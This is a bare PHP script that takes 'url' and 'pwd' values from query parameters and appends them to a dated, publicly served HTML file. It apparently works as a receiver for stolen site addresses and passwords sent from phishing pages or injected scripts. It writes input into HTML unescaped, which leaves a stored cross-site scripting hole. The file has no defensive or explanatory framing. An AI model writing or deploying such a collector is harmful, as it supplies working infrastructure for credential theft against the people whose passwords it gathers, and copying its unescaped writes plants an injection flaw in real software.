<?php
date_default_timezone_set("PRC");
$url = $_GET['url'];
$pwd = $_GET['pwd'];
$time = date('Y-m-d',time());
$file_path = $time.'.html';
$fp=fopen($file_path,"a+");
$con = $url.'|'.$pwd."<br />";
fwrite($fp,$con);
fclose($fp);
?>
